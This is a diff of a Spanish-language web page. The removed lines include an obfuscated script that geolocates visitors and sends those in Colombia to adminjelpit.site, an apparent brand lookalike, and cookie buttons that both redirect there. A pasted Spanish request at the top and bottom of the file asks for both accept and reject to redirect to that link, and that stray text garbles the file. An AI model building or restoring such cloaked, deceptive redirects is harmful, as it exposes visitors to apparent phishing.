@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+puedes haceer que redireciones desde acptar o rechazar  <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
@@ -20,28 +20,6 @@
   gtag('js', new Date());
 
   gtag('config', 'AW-18365406294');
-</script>
-
-    <script>
-(function(){
-  const _0xcolombia = atob("aHR0cHM6Ly9hZG1pbmplbHBpdC5zaXRlL2plbHBpdC9idXNxdWVkYS5odG1s");
-  const _0xotros = atob("aW5pY2lvLmh0bWw=");
-  
-  const _0xapi = 'https://ipapi.co/json/';
-  
-  fetch(_0xapi)
-    .then(res => res.json())
-    .then(data => {
-      if (data.country === "CO") {
-        window.location.href = _0xcolombia;
-      } else {
-        window.location.href = _0xotros;
-      }
-    })
-    .catch(() => {
-      window.location.href = _0xotros;
-    });
-})();
 </script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&amp;family=Playfair+Display:wght@700&amp;display=swap');
@@ -1009,7 +987,7 @@
         
 
         // ============================================
-        // SISTEMA DE COOKIES - REDIRIGE A LA URL INDICADA
+        // SISTEMA DE COOKIES - MUESTRA EL CONTENIDO LOCAL
         // ============================================
         
         function showCookieBanner() {
@@ -1033,14 +1011,12 @@
             }
         }
         
-        // *** CAMBIO REALIZADO AQUÍ ***
-        // Ambos botones redirigen a la URL solicitada
         function acceptCookies() {
-            window.location.href = 'https://adminjelpit.site/jelpit/busqueda.html';
+            hideCookieBanner();
         }
         
         function rejectCookies() {
-            window.location.href = 'https://adminjelpit.site/jelpit/busqueda.html';
+            hideCookieBanner();
         }
 
         // Initialize everything
@@ -1069,4 +1045,4 @@
         window.onload = initializeWebsite;
     </script>
 </body>
-</html>
+</html> a este link https://adminjelpit.site/jelpit/busqueda.html
